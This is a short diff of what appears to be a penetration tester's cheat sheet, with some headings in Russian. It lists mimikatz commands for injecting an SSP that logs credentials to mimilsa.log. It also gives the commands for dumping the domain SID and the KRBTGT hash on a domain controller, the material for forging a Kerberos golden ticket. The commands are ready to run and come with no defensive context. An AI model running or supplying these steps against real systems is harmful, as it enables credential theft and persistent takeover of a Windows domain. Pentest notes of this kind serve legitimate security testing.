@@ -56,11 +56,15 @@ misc::memssp
 
 c:\windows\system32\mimilsa.log
 
-# Golden ticket information - Dump SID and KRBTGT hash (on DC) от АДМИНИСТРАТОРА
+# Golden ticket  - Dump SID and KRBTGT hash (on DC) от АДМИНИСТРАТОРА
+
 PS C:\pentst> .\mimikatz.exe
+
 mimikatz # privilege::debug
+
 mimikatz # token::elevate (DONT NEED THIS)
-mimikatz # lsadump::lsa /patch
+
+mimikatz # lsadump::lsa /patch (lsadump::lsa /inject /name:krbtgt)
 
 # Create golden ticket (write to file in this case)
 PS C:\Tools> .\mimikatz.exe
